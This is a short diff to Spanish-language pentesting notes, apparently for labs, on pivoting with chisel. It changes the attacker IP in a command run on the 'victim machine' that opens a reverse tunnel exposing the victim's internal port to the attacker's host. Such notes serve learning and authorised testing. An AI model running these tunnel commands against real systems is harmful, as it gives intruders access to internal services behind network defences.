@@ -7,7 +7,7 @@ Para ver un puerto interno de la máquina en nuestro host con chisel.
 ./chisel server --reverse -p 1234
 ---
 # Máquina víctima
-./chisel client 10.10.10.10:1234 R:<puerto atacante>:127.0.0.1:<puerto víctima>
+./chisel client 192.168.1.95:1234 R:<puerto atacante>:127.0.0.1:<puerto víctima>
 ```
 
 # Local port forwarding con SSH
